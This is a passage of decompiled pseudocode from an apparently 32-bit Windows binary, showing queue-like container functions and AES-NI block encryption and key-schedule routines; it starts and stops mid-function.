  int **v29; // eax
  _DWORD *v30; // eax
  _DWORD *v31; // eax
  _DWORD *v32; // esi
  unsigned int v33; // ecx
  _DWORD *v34; // eax
  int **v35; // eax
  _DWORD *v36; // eax
  _DWORD *v37; // eax
  _DWORD *v38; // esi
  int v39; // esi
  _DWORD *v40; // eax
  _DWORD *v42; // [esp-24h] [ebp-9Ch] BYREF
  int v43; // [esp-20h] [ebp-98h]
  _DWORD **v44; // [esp-1Ch] [ebp-94h] BYREF
  _DWORD **v45; // [esp-18h] [ebp-90h] BYREF
  int v46; // [esp-14h] [ebp-8Ch]
  _DWORD **v47; // [esp-10h] [ebp-88h] BYREF
  _DWORD **v48; // [esp-Ch] [ebp-84h] BYREF
  int v49; // [esp-8h] [ebp-80h]
  int *v50; // [esp-4h] [ebp-7Ch]
  int v51[3]; // [esp+10h] [ebp-68h] BYREF
  int v52[3]; // [esp+1Ch] [ebp-5Ch] BYREF
  _DWORD v53[3]; // [esp+28h] [ebp-50h] BYREF
  _DWORD v54[3]; // [esp+34h] [ebp-44h] BYREF
  _DWORD **v55[2]; // [esp+40h] [ebp-38h] BYREF
  int *v56; // [esp+48h] [ebp-30h]
  int v57; // [esp+4Ch] [ebp-2Ch] BYREF
  int v58; // [esp+50h] [ebp-28h] BYREF
  int v59; // [esp+54h] [ebp-24h]
  _DWORD *v60; // [esp+58h] [ebp-20h]
  unsigned int v61; // [esp+5Ch] [ebp-1Ch]
  unsigned int v62; // [esp+60h] [ebp-18h]
  int v63; // [esp+64h] [ebp-14h]
  int v64; // [esp+74h] [ebp-4h]
  int v65; // [esp+8Ch] [ebp+14h]

  v60 = this;
  v55[0] = 0;
  v55[1] = 0;
  v56 = 0;
  v7 = a4 - sub_428344(this, &v57)[2];
  v8 = this[4] - v7;
  v59 = this[4];
  v9 = a5;
  v63 = v7;
  v62 = v8;
  if ( v7 >= v8 )
  {
    v64 = 2;
    v63 = a5;
    if ( v8 >= a5 )
    {
      v33 = 0;
      v61 = 0;
      while ( v33 < v9 )
      {
        v34 = sub_428344(this, v53);
        v35 = (int **)sub_427484((int)v34, v54, v7 + v62 + v61 - a5);
        v36 = (_DWORD *)sub_427416(v35);
        sub_4286F5(this, v36);
        v9 = v63;
        v33 = ++v61;
      }
      v37 = sub_428344(this, v54);
      v38 = sub_427484((int)v37, v53, v7);
      sub_41D6C1(v55, (_DWORD ***)v38);
      v17 = v38[2];
      v39 = v62;
      v56 = (int *)v17;
      v58 = *a6;
      v59 = a6[1];
      sub_427484((int)v55, &v48, v62);
      v40 = sub_427484((int)v55, v52, v39);
      sub_42743E((int)v40, &v45, a5);
      v42 = 0;
      v43 = 0;
      sub_41D6C1(&v42, v55);
      sub_4271E9(v51, (_DWORD **)v42, v43, v17, v45, v46, (unsigned int)v47, v48, v49, (unsigned int)v50);
      v50 = &v58;
      v46 = a5;
    }
    else
    {
      for ( i = a5 - v8; ; i = v63 - 1 )
      {
        v63 = i;
        if ( !i )
          break;
        sub_4286F5(this, a6);
      }
      v27 = 0;
      v65 = 0;
      while ( v27 < v62 )
      {
        v28 = sub_428344(this, v53);
        v29 = (int **)sub_427484((int)v28, v54, v7 + v65);
        v30 = (_DWORD *)sub_427416(v29);
        sub_4286F5(this, v30);
        v27 = ++v65;
      }
      v31 = sub_428344(this, v54);
      v32 = sub_427484((int)v31, v53, v7);
      sub_41D6C1(v55, (_DWORD ***)v32);
      v50 = a6;
      v17 = v32[2];
      v56 = (int *)v17;
      v46 = v62;
    }
    goto LABEL_25;
  }
  v64 = 0;
  if ( v7 < a5 )
  {
    for ( j = a5 - v7; ; j = v61 - 1 )
    {
      v61 = j;
      if ( !j )
        break;
      sub_428801((int)this, a6);
    }
    for ( k = v7; ; k = v61 - 1 )
    {
      v61 = k;
      if ( !k )
        break;
      v12 = sub_428344(this, v54);
      v13 = (int **)sub_427484((int)v12, v53, a5 - 1);
      v14 = (_DWORD *)sub_427416(v13);
      sub_428801((int)this, v14);
    }
    v15 = sub_428344(this, v54);
    v16 = sub_427484((int)v15, v53, a5);
    sub_41D6C1(v55, (_DWORD ***)v16);
    v50 = a6;
    v17 = v16[2];
    v56 = (int *)v17;
    v46 = v63;
LABEL_25:
    sub_427484((int)v55, &v47, v46);
    v44 = 0;
    v45 = 0;
    sub_41D6C1(&v44, v55);
    v46 = v17;
    return sub_42702D(v44, (int)v45, v46, v47, (int)v48, v49, v50);
  }
  while ( 1 )
  {
    v61 = v9;
    if ( !v9 )
      break;
    v18 = sub_428344(this, v53);
    v19 = (int **)sub_427484((int)v18, v54, a5 - 1);
    v20 = (_DWORD *)sub_427416(v19);
    sub_428801((int)this, v20);
    v9 = v61 - 1;
  }
  v21 = sub_428344(this, v54);
  v22 = sub_427484((int)v21, v53, a5);
  sub_41D6C1(v55, (_DWORD ***)v22);
  v56 = (int *)v22[2];
  v23 = v56;
  v58 = *a6;
  v59 = a6[1];
  v48 = 0;
  v49 = 0;
  sub_41D6C1(&v48, v55);
  v50 = v23;
  v24 = v63;
  sub_427484((int)v55, &v45, v63);
  sub_427484((int)v55, &v42, a5);
  sub_4270F5(v53, (_DWORD **)v42, v43, (unsigned int)v44, v45, v46, (int)v47, v48, v49, (unsigned int)v50);
  v50 = &v58;
  sub_427484((int)v55, &v47, v24);
  v43 = v24;
  v42 = &v44;
  v25 = sub_428344(v60, v53);
  sub_427484((int)v25, v42, v43);
  return sub_42702D(v44, (int)v45, v46, v47, (int)v48, v49, v50);
}
// 427DC2: using guessed type _DWORD var_44[3];
// 427DC2: using guessed type _DWORD var_50[3];
// 427DC2: using guessed type int var_5C[3];
// 427DC2: using guessed type int var_68[3];

//----- (00428163) --------------------------------------------------------
_DWORD *__thiscall sub_428163(_DWORD *this, _DWORD *a2, int a3, int a4, int a5)
{
  sub_4272AE(a2, a5, this);
  return a2;
}

//----- (00428178) --------------------------------------------------------
void __thiscall sub_428178(int this)
{
  int v3; // edi
  int v4; // eax

  while ( *(_DWORD *)(this + 16) )
  {
    if ( (*(_DWORD *)(this + 16))-- == 1 )
      *(_DWORD *)(this + 12) = 0;
  }
  v3 = *(_DWORD *)(this + 8);
  while ( v3 )
  {
    v4 = *(_DWORD *)(this + 4);
    --v3;
    if ( *(_DWORD *)(v4 + 4 * v3) )
      std::_Deallocate(*(void **)(v4 + 4 * v3), 4u, 4u);
  }
  if ( *(_DWORD *)(this + 4) )
    std::_Deallocate(*(void **)(this + 4), *(_DWORD *)(this + 8), 4u);
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 4) = 0;
}

//----- (004281CF) --------------------------------------------------------
void __thiscall sub_4281CF(int this)
{
  int v3; // edi
  int v4; // eax

  while ( *(_DWORD *)(this + 16) )
  {
    if ( (*(_DWORD *)(this + 16))-- == 1 )
      *(_DWORD *)(this + 12) = 0;
  }
  v3 = *(_DWORD *)(this + 8);
  while ( v3 )
  {
    v4 = *(_DWORD *)(this + 4);
    --v3;
    if ( *(_DWORD *)(v4 + 4 * v3) )
      std::_Deallocate(*(void **)(v4 + 4 * v3), 2u, 8u);
  }
  if ( *(_DWORD *)(this + 4) )
    std::_Deallocate(*(void **)(this + 4), *(_DWORD *)(this + 8), 4u);
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 4) = 0;
}

//----- (00428226) --------------------------------------------------------
int __thiscall sub_428226(_DWORD *this, unsigned int a2, int *a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD **v8; // [esp-18h] [ebp-44h] BYREF
  int v9; // [esp-14h] [ebp-40h] BYREF
  int v10; // [esp-10h] [ebp-3Ch]
  _DWORD **v11; // [esp-Ch] [ebp-38h] BYREF
  unsigned int v12; // [esp-8h] [ebp-34h]
  int *v13; // [esp-4h] [ebp-30h]
  _DWORD v14[3]; // [esp+4h] [ebp-28h] BYREF
  int v15[3]; // [esp+10h] [ebp-1Ch] BYREF
  int v16[4]; // [esp+1Ch] [ebp-10h] BYREF

  v4 = sub_428358(this, v16);
  sub_42728C(&v11, (int)v4);
  v5 = sub_428344(this, v15);
  sub_42728C(&v8, (int)v5);
  sub_428370(this, v14, v8, v9, v10, v11, v12, (int)v13);
  v13 = a3;
  v12 = a2;
  v6 = sub_428344(this, v14);
  sub_42728C(&v9, (int)v6);
  return sub_427A2D(this, v9, v10, (int)v11, v12, v13);
}
// 428226: using guessed type int var_10[4];
// 428226: using guessed type int var_1C[3];
// 428226: using guessed type _DWORD var_28[3];

//----- (0042828E) --------------------------------------------------------
int __thiscall sub_42828E(_DWORD *this, unsigned int a2, int *a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD **v8; // [esp-18h] [ebp-44h] BYREF
  int v9; // [esp-14h] [ebp-40h] BYREF
  int v10; // [esp-10h] [ebp-3Ch]
  _DWORD **v11; // [esp-Ch] [ebp-38h] BYREF
  unsigned int v12; // [esp-8h] [ebp-34h]
  int *v13; // [esp-4h] [ebp-30h]
  _DWORD v14[3]; // [esp+4h] [ebp-28h] BYREF
  int v15[3]; // [esp+10h] [ebp-1Ch] BYREF
  int v16[4]; // [esp+1Ch] [ebp-10h] BYREF

  v4 = sub_428358(this, v16);
  sub_42728C(&v11, (int)v4);
  v5 = sub_428344(this, v15);
  sub_42728C(&v8, (int)v5);
  sub_4284F2(this, v14, v8, v9, v10, v11, v12, (int)v13);
  v13 = a3;
  v12 = a2;
  v6 = sub_428344(this, v14);
  sub_42728C(&v9, (int)v6);
  return sub_427DC2(this, v9, v10, (int)v11, v12, v13);
}
// 42828E: using guessed type int var_10[4];
// 42828E: using guessed type int var_1C[3];
// 42828E: using guessed type _DWORD var_28[3];

//----- (00428344) --------------------------------------------------------
_DWORD *__thiscall sub_428344(_DWORD *this, _DWORD *a2)
{
  sub_4272AE(a2, this[3], this);
  return a2;
}

//----- (00428358) --------------------------------------------------------
_DWORD *__thiscall sub_428358(_DWORD *this, _DWORD *a2)
{
  sub_4272AE(a2, this[3] + this[4], this);
  return a2;
}

//----- (00428370) --------------------------------------------------------
_DWORD *__thiscall sub_428370(_DWORD *this, _DWORD *a2, _DWORD **a3, int a4, int a5, _DWORD **a6, int a7, int a8)
{
  _DWORD *v9; // eax
  unsigned int v10; // esi
  int v11; // ebx
  unsigned int v12; // ebp
  unsigned int v13; // eax
  bool v14; // zf
  _DWORD *v15; // eax
  _DWORD **v17; // [esp-24h] [ebp-5Ch] BYREF
  int v18; // [esp-20h] [ebp-58h]
  int v19; // [esp-1Ch] [ebp-54h]
  _DWORD **v20; // [esp-18h] [ebp-50h] BYREF
  int v21; // [esp-14h] [ebp-4Ch]
  int v22; // [esp-10h] [ebp-48h]
  _DWORD **v23; // [esp-Ch] [ebp-44h] BYREF
  _DWORD *v24; // [esp-8h] [ebp-40h]
  int v25; // [esp-4h] [ebp-3Ch]
  _DWORD **v26[2]; // [esp+14h] [ebp-24h] BYREF
  int v27; // [esp+1Ch] [ebp-1Ch]
  _DWORD **v28[2]; // [esp+20h] [ebp-18h] BYREF
  unsigned int v29; // [esp+28h] [ebp-10h]
  _DWORD v30[3]; // [esp+2Ch] [ebp-Ch] BYREF

  v23 = 0;
  v24 = 0;
  sub_41D6C1(&v23, &a3);
  sub_428163(this, v26, (int)v23, (int)v24, a5);
  v23 = 0;
  v24 = 0;
  sub_41D6C1(&v23, &a6);
  sub_428163(this, v28, (int)v23, (int)v24, a8);
  v9 = sub_428344(this, v30);
  v10 = v29;
  v11 = v29 - v27;
  v12 = v27 - v9[2];
  v13 = sub_428358(this, v30)[2] - v10;
  v23 = 0;
  v24 = 0;
  if ( v12 >= v13 )
  {
    sub_41D6C1(&v23, v26);
    v25 = v27;
    sub_428358(this, &v20);
    v17 = 0;
    v18 = 0;
    sub_41D6C1(&v17, v28);
    sub_427088(v30, v17, v18, v29, v20, v21, v22, v23, (int)v24, v25);
    for ( ; v11; --v11 )
    {
      v14 = this[4]-- == 1;
      if ( v14 )
        this[3] = 0;
    }
  }
  else
  {
    sub_41D6C1(&v23, v28);
    v25 = v29;
    v20 = 0;
    v21 = 0;
    sub_41D6C1(&v20, v26);
    v22 = v27;
    sub_428344(this, &v17);
    sub_427162(v30, v17, v18, v19, v20, v21, v22, v23, (int)v24, v25);
    for ( ; v11; --v11 )
    {
      v14 = this[4]-- == 1;
      if ( v14 )
        this[3] = 0;
      else
        ++this[3];
    }
  }
  v25 = v12;
  v24 = a2;
  v15 = sub_428344(this, v30);
  sub_427484((int)v15, v24, v25);
  return a2;
}
// 428370: using guessed type _DWORD var_C[3];

//----- (004284F2) --------------------------------------------------------
_DWORD *__thiscall sub_4284F2(_DWORD *this, _DWORD *a2, _DWORD **a3, int a4, int a5, _DWORD **a6, int a7, int a8)
{
  _DWORD *v9; // eax
  unsigned int v10; // esi
  int v11; // ebx
  unsigned int v12; // ebp
  unsigned int v13; // eax
  bool v14; // zf
  _DWORD *v15; // eax
  _DWORD **v17; // [esp-24h] [ebp-5Ch] BYREF
  int v18; // [esp-20h] [ebp-58h]
  int v19; // [esp-1Ch] [ebp-54h]
  _DWORD **v20; // [esp-18h] [ebp-50h] BYREF
  int v21; // [esp-14h] [ebp-4Ch]
  int v22; // [esp-10h] [ebp-48h]
  _DWORD **v23; // [esp-Ch] [ebp-44h] BYREF
  _DWORD *v24; // [esp-8h] [ebp-40h]
  int v25; // [esp-4h] [ebp-3Ch]
  _DWORD **v26[2]; // [esp+14h] [ebp-24h] BYREF
  int v27; // [esp+1Ch] [ebp-1Ch]
  _DWORD **v28[2]; // [esp+20h] [ebp-18h] BYREF
  unsigned int v29; // [esp+28h] [ebp-10h]
  _DWORD v30[3]; // [esp+2Ch] [ebp-Ch] BYREF

  v23 = 0;
  v24 = 0;
  sub_41D6C1(&v23, &a3);
  sub_428163(this, v26, (int)v23, (int)v24, a5);
  v23 = 0;
  v24 = 0;
  sub_41D6C1(&v23, &a6);
  sub_428163(this, v28, (int)v23, (int)v24, a8);
  v9 = sub_428344(this, v30);
  v10 = v29;
  v11 = v29 - v27;
  v12 = v27 - v9[2];
  v13 = sub_428358(this, v30)[2] - v10;
  v23 = 0;
  v24 = 0;
  if ( v12 >= v13 )
  {
    sub_41D6C1(&v23, v26);
    v25 = v27;
    sub_428358(this, &v20);
    v17 = 0;
    v18 = 0;
    sub_41D6C1(&v17, v28);
    sub_4270F5(v30, v17, v18, v29, v20, v21, v22, v23, (int)v24, v25);
    for ( ; v11; --v11 )
    {
      v14 = this[4]-- == 1;
      if ( v14 )
        this[3] = 0;
    }
  }
  else
  {
    sub_41D6C1(&v23, v28);
    v25 = v29;
    v20 = 0;
    v21 = 0;
    sub_41D6C1(&v20, v26);
    v22 = v27;
    sub_428344(this, &v17);
    sub_4271E9(v30, v17, v18, v19, v20, v21, v22, v23, (int)v24, v25);
    for ( ; v11; --v11 )
    {
      v14 = this[4]-- == 1;
      if ( v14 )
        this[3] = 0;
      else
        ++this[3];
    }
  }
  v25 = v12;
  v24 = a2;
  v15 = sub_428344(this, v30);
  sub_427484((int)v15, v24, v25);
  return a2;
}
// 4284F2: using guessed type _DWORD var_C[3];

//----- (00428674) --------------------------------------------------------
int __thiscall sub_428674(_DWORD *this, int *a2)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // edi
  int v6; // ebx
  int result; // eax
  int *v8; // ecx

  v3 = this[3];
  v4 = this[4];
  if ( (((_BYTE)v4 + (_BYTE)v3) & 3) == 0 && this[2] <= (unsigned int)(v4 + 4) >> 2 )
    sub_4277E6((int)this, 1u);
  this[3] &= 4 * this[2] - 1;
  v5 = this[3] + this[4];
  v6 = (v5 >> 2) & (this[2] - 1);
  if ( !*(_DWORD *)(this[1] + 4 * v6) )
    *(_DWORD *)(this[1] + 4 * v6) = sub_40B7DF(4u, 4u, 1);
  result = *(_DWORD *)(this[1] + 4 * v6);
  v8 = (int *)(result + 4 * (v5 & 3));
  if ( v8 )
  {
    result = *a2;
    *v8 = *a2;
  }
  ++this[4];
  return result;
}

//----- (004286F5) --------------------------------------------------------
int __thiscall sub_4286F5(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // ebx
  int v6; // edi
  int result; // eax
  _DWORD *v8; // edx

  v3 = this[3];
  v4 = this[4];
  if ( (((_BYTE)v4 + (_BYTE)v3) & 1) == 0 && this[2] <= (unsigned int)(v4 + 2) >> 1 )
    sub_42790A((int)this, 1u);
  this[3] &= 2 * this[2] - 1;
  v5 = this[3] + this[4];
  v6 = (v5 >> 1) & (this[2] - 1);
  if ( !*(_DWORD *)(this[1] + 4 * v6) )
    *(_DWORD *)(this[1] + 4 * v6) = sub_40B7DF(2u, 8u, 1);
  result = *(_DWORD *)(this[1] + 4 * v6);
  v8 = (_DWORD *)(result + 8 * (v5 & 1));
  if ( v8 )
  {
    *v8 = *a2;
    result = a2[1];
    v8[1] = result;
  }
  ++this[4];
  return result;
}

//----- (0042877A) --------------------------------------------------------
int __thiscall sub_42877A(int this, int *a2)
{
  int v3; // eax
  bool v4; // zf
  int v5; // edi
  unsigned int v6; // edi
  int v7; // ebx
  int result; // eax
  int *v9; // ecx

  if ( (*(_BYTE *)(this + 12) & 3) == 0 && *(_DWORD *)(this + 8) <= (unsigned int)(*(_DWORD *)(this + 16) + 4) >> 2 )
    sub_4277E6(this, 1u);
  v3 = 4 * *(_DWORD *)(this + 8) - 1;
  v4 = (v3 & *(_DWORD *)(this + 12)) == 0;
  *(_DWORD *)(this + 12) &= v3;
  v5 = *(_DWORD *)(this + 12);
  if ( v4 )
    v5 = 4 * *(_DWORD *)(this + 8);
  v6 = v5 - 1;
  v7 = (v6 >> 2) & (*(_DWORD *)(this + 8) - 1);
  if ( !*(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v7) )
    *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v7) = sub_40B7DF(4u, 4u, 1);
  result = *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v7);
  v9 = (int *)(result + 4 * (v6 & 3));
  if ( v9 )
  {
    result = *a2;
    *v9 = *a2;
  }
  *(_DWORD *)(this + 12) = v6;
  ++*(_DWORD *)(this + 16);
  return result;
}

//----- (00428801) --------------------------------------------------------
int __thiscall sub_428801(int this, _DWORD *a2)
{
  int v3; // eax
  bool v4; // zf
  int v5; // edi
  unsigned int v6; // edi
  int v7; // ebx
  int result; // eax
  _DWORD *v9; // edx

  if ( (*(_BYTE *)(this + 12) & 1) == 0 && *(_DWORD *)(this + 8) <= (unsigned int)(*(_DWORD *)(this + 16) + 2) >> 1 )
    sub_42790A(this, 1u);
  v3 = 2 * *(_DWORD *)(this + 8) - 1;
  v4 = (v3 & *(_DWORD *)(this + 12)) == 0;
  *(_DWORD *)(this + 12) &= v3;
  v5 = *(_DWORD *)(this + 12);
  if ( v4 )
    v5 = 2 * *(_DWORD *)(this + 8);
  v6 = v5 - 1;
  v7 = (v6 >> 1) & (*(_DWORD *)(this + 8) - 1);
  if ( !*(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v7) )
    *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v7) = sub_40B7DF(2u, 8u, 1);
  result = *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v7);
  v9 = (_DWORD *)(result + 8 * (v6 & 1));
  if ( v9 )
  {
    *v9 = *a2;
    result = a2[1];
    v9[1] = result;
  }
  *(_DWORD *)(this + 12) = v6;
  ++*(_DWORD *)(this + 16);
  return result;
}

//----- (0042888B) --------------------------------------------------------
unsigned int __cdecl sub_42888B(
        void (__cdecl *a1)(__m128i *, int, int),
        void (__cdecl *a2)(__m128i *, __m128i *, __m128i *, __m128i *, int, int),
        int a3,
        int a4,
        __m128i *a5,
        __m128i *a6,
        __m128i *a7,
        unsigned int a8,
        char a9)
{
  char v9; // dl
  __m128i *v10; // esi
  int v11; // eax
  int v12; // ecx
  unsigned int v13; // edi
  __m128i *v14; // eax
  __m128i v15; // xmm4
  __m128i v16; // xmm1
  __m128i v17; // xmm2
  __m128i v18; // xmm3
  __m128i *v19; // eax
  __m128i *v20; // eax
  __m128i *v21; // eax
  __m128i v22; // xmm0
  __m128i *v23; // esi
  __m128i v24; // xmm0
  __m128i *v25; // esi
  __m128i v26; // xmm0
  __m128i *v27; // esi
  __m128i v28; // xmm0
  __m128i v29; // xmm0
  __m128i *v30; // esi
  __m128i v31; // xmm0
  __m128i v32; // xmm1
  __m128i *v33; // esi
  __m128i v34; // xmm1
  __m128i v35; // xmm2
  __m128i *v36; // esi
  __m128i v37; // xmm2
  __m128i v38; // xmm3
  __m128i v39; // xmm3
  __m128i *v40; // edx
  __m128i *v41; // edx
  bool v42; // zf
  __m128i *v43; // eax
  int v44; // edx
  __m128i v45; // xmm1
  __m128i v46; // xmm0
  char v48; // [esp+Fh] [ebp-71h]
  __m128i *v49; // [esp+10h] [ebp-70h]
  __m128i *v50; // [esp+14h] [ebp-6Ch]
  int v51; // [esp+18h] [ebp-68h]
  int v52; // [esp+1Ch] [ebp-64h]
  int v53; // [esp+20h] [ebp-60h]
  char v54; // [esp+24h] [ebp-5Ch]
  unsigned int v55; // [esp+28h] [ebp-58h]
  unsigned int v56; // [esp+28h] [ebp-58h]
  __m128i v57; // [esp+30h] [ebp-50h]
  __m128i v58; // [esp+40h] [ebp-40h] BYREF
  __m128i v59; // [esp+50h] [ebp-30h] BYREF
  __m128i v60; // [esp+60h] [ebp-20h] BYREF
  __m128i v61; // [esp+70h] [ebp-10h] BYREF
  int v62; // [esp+A8h] [ebp+28h]

  v9 = a9;
  v10 = a6;
  v54 = 0;
  v57.m128i_i64[0] = 0i64;
  v57.m128i_i32[2] = 0;
  v11 = 16;
  if ( (a9 & 3) != 0 )
    v11 = 0;
  v57.m128i_i32[3] = 0x1000000;
  v51 = v11;
  v12 = a6 != 0 ? 0x10 : 0;
  v53 = v12;
  v52 = ~(8 * a9) & 0x10;
  if ( !a6 || (v48 = 1, (a9 & 4) == 0) )
    v48 = 0;
  if ( a6 && (a9 & 4) == 0 )
    v54 = 1;
  v13 = a8;
  if ( (a9 & 8) != 0 )
  {
    v51 = -v11;
    v12 = -v12;
    v49 = (__m128i *)((char *)a5 + a8 - 16);
    v10 = (__m128i *)((char *)a6 + a8 - 16);
    v53 = v12;
    v52 = -v52;
    v50 = (__m128i *)((char *)a7 + a8 - 16);
    v14 = v49;
  }
  else
  {
    v50 = a7;
    v14 = a5;
    v49 = a5;
  }
  if ( (a9 & 0x10) != 0 && a8 >= 0x40 )
  {
    v55 = a8 >> 6;
    do
    {
      v15 = *v14;
      v58 = *v14;
      if ( (a9 & 1) != 0 )
      {
        v16 = _mm_add_epi32(v15, v57);
        v17 = _mm_add_epi32(v16, v57);
        v18 = _mm_add_epi32(v17, v57);
        *v14 = _mm_add_epi32(v18, v57);
      }
      else
      {
        v19 = (__m128i *)((char *)v14 + v51);
        v16 = *v19;
        v20 = (__m128i *)((char *)v19 + v51);
        v17 = *v20;
        v21 = (__m128i *)((char *)v20 + v51);
        v18 = *v21;
        v49 = (__m128i *)((char *)v21 + v51);
      }
      v61 = v18;
      v60 = v17;
      v59 = v16;
      if ( v48 )
      {
        v22 = *v10;
        v23 = (__m128i *)((char *)v10 + v12);
        v58 = _mm_xor_si128(v22, v15);
        v24 = *v23;
        v25 = (__m128i *)((char *)v23 + v12);
        v59 = _mm_xor_si128(v24, v16);
        v26 = *v25;
        v27 = (__m128i *)((char *)v25 + v12);
        v60 = _mm_xor_si128(v26, v17);
        v28 = *v27;
        v10 = (__m128i *)((char *)v27 + v12);
        v61 = _mm_xor_si128(v28, v18);
      }
      a2(&v58, &v59, &v60, &v61, a3, a4);
      v12 = v53;
      if ( v54 )
      {
        v29 = *v10;
        v30 = (__m128i *)((char *)v10 + v53);
        v31 = _mm_xor_si128(v29, v58);
        v32 = *v30;
        v33 = (__m128i *)((char *)v30 + v53);
        v34 = _mm_xor_si128(v32, v59);
        v35 = *v33;
        v36 = (__m128i *)((char *)v33 + v53);
        v37 = _mm_xor_si128(v35, v60);
        v38 = *v36;
        v10 = (__m128i *)((char *)v36 + v53);
        v39 = _mm_xor_si128(v38, v61);
      }
      else
      {
        v31 = v58;
        v34 = v59;
        v37 = v60;
        v39 = v61;
      }
      v13 -= 64;
      *v50 = v31;
      *(__m128i *)((char *)v50 + v52) = v34;
      v40 = (__m128i *)((char *)v50 + v52 + v52);
      *v40 = v37;
      v41 = (__m128i *)((char *)v40 + v52);
      *v41 = v39;
      v42 = v55-- == 1;
      v14 = v49;
      v50 = (__m128i *)((char *)v41 + v52);
    }
    while ( !v42 );
    v9 = a9;
  }
  if ( v13 >= 0x10 )
  {
    v43 = v49;
    v44 = v9 & 1;
    v62 = v44;
    v56 = v13 >> 4;
    do
    {
      v45 = *v43;
      v61 = *v43;
      if ( v48 )
        v61 = _mm_xor_si128(*v10, v45);
      if ( v44 )
        ++v43->m128i_i8[15];
      a1(&v61, a3, a4);
      if ( v54 )
        v46 = _mm_xor_si128(*v10, v61);
      else
        v46 = v61;
      v13 -= 16;
      v43 = (__m128i *)((char *)v49 + v51);
      v10 = (__m128i *)((char *)v10 + v53);
      v44 = v62;
      *v50 = v46;
      v42 = v56-- == 1;
      v49 = (__m128i *)((char *)v49 + v51);
      v50 = (__m128i *)((char *)v50 + v52);
    }
    while ( !v42 );
  }
  return v13;
}

//----- (00428B46) --------------------------------------------------------
__m128i *__cdecl sub_428B46(__m128i *a1, __m128i *a2, __m128i *a3, __m128i *a4, __m128i *a5, unsigned int a6)
{
  __m128i v7; // xmm1
  __m128i *result; // eax
  unsigned int v9; // edi
  __m128i *v10; // edi
  bool v11; // zf
  unsigned int v30; // [esp+Ch] [ebp+8h]

  v7 = *a5;
  result = a1;
  v9 = a6;
  *a1 = _mm_xor_si128(*a1, *a5);
  *a2 = _mm_xor_si128(*a2, v7);
  *a3 = _mm_xor_si128(*a3, v7);
  *a4 = _mm_xor_si128(*a4, v7);
  if ( a6 > 1 )
  {
    v10 = a5 + 1;
    v30 = a6 - 1;
    result = a1;
    do
    {
      v11 = v30-- == 1;
      _XMM1 = (__int128)*v10++;
      _XMM0 = *a1;
      __asm { aesenc  xmm0, xmm1 }
      *a1 = _XMM0;
      _XMM0 = *a2;
      __asm { aesenc  xmm0, xmm1 }
      *a2 = _XMM0;
      _XMM0 = *a3;
      __asm { aesenc  xmm0, xmm1 }
      *a3 = _XMM0;
      _XMM0 = *a4;
      __asm { aesenc  xmm0, xmm1 }
      *a4 = _XMM0;
    }
    while ( !v11 );
    v9 = a6;
  }
  _XMM0 = *result;
  _XMM1 = a5[v9];
  __asm { aesenclast xmm0, xmm1 }
  *result = _XMM0;
  _XMM0 = *a2;
  __asm { aesenclast xmm0, xmm1 }
  *a2 = _XMM0;
  _XMM0 = *a3;
  __asm { aesenclast xmm0, xmm1 }
  *a3 = _XMM0;
  _XMM0 = *a4;
  __asm { aesenclast xmm0, xmm1 }
  *a4 = _XMM0;
  return result;
}

//----- (00428C24) --------------------------------------------------------
__m128i *__cdecl sub_428C24(__m128i *a1, __m128i *a2, int a3)
{
  __m128i *result; // eax
  unsigned int v6; // ecx

  result = a1;
  _ESI = a2;
  *a1 = _mm_xor_si128(*a1, *a2);
  if ( (unsigned int)(a3 - 1) > 1 )
  {
    _EDI = a2 + 1;
    v6 = ((unsigned int)(a3 - 3) >> 1) + 1;
    do
    {
      _XMM0 = *a1;
      __asm { aesenc  xmm0, xmmword ptr [edi] }
      *a1 = _XMM0;
      _EDI += 2;
      __asm { aesenc  xmm0, xmmword ptr [edi-10h] }
      *a1 = _XMM0;
      --v6;
    }
    while ( v6 );
  }
  _XMM0 = *a1;
  _EDX = 2 * a3;
  __asm { aesenc  xmm0, xmmword ptr [esi+edx*8-10h] }
  *a1 = _XMM0;
  __asm { aesenclast xmm0, xmmword ptr [esi+edx*8] }
  *a1 = _XMM0;
  return result;
}

//----- (00428C84) --------------------------------------------------------
unsigned int __cdecl sub_428C84(int a1, int a2, __m128i *a3, __m128i *a4, __m128i *a5, unsigned int a6, char a7)
{
  return sub_42888B(
           (void (__cdecl *)(__m128i *, int, int))sub_428C24,
           (void (__cdecl *)(__m128i *, __m128i *, __m128i *, __m128i *, int, int))sub_428B46,
           a1,
           a2,
           a3,
           a4,
           a5,
           a6,
           a7);
}

//----- (00428CB0) --------------------------------------------------------
unsigned int __cdecl sub_428CB0(_OWORD *a1, int a2)
{
  __int128 v4; // xmm1
  unsigned int result; // eax

  _EDX = a1;
  _ECX = 4 * a2 - 4;
  v4 = *a1;
  *a1 = a1[a2];
  a1[a2] = v4;
  for ( result = 4; result < _ECX; _ECX -= 4 )
  {
    __asm
    {
      aesimc  xmm0, xmmword ptr [edx+ecx*4]
      aesimc  xmm1, xmmword ptr [edx+eax*4]
    }
    a1[result / 4] = _XMM0;
    result += 4;
    *(_OWORD *)((char *)a1 + 4 * _ECX) = _XMM1;
  }
  __asm { aesimc  xmm0, xmmword ptr [edx+eax*4] }
  a1[result / 4] = _XMM0;
  return result;
}

//----- (00428D01) --------------------------------------------------------
char *__cdecl sub_428D01(char *Src, size_t Size, char *a3)
{
  int *v3; // esi
  size_t v5; // edi
  int *v7; // edx
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  char *result; // eax
  int v12; // eax
  int v13; // ecx
  int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  _DWORD *v21; // ecx
  int v22; // eax
  int v23; // ecx
  int *v24; // [esp+14h] [ebp-1Ch]
  _DWORD *v25; // [esp+18h] [ebp-18h]
  __m128i v26; // [esp+20h] [ebp-10h]

  v3 = (int *)a3;
  v26 = *(__m128i *)&Src[Size - 16];
  memmove_0(a3, Src, Size);
  _XMM1 = v26;
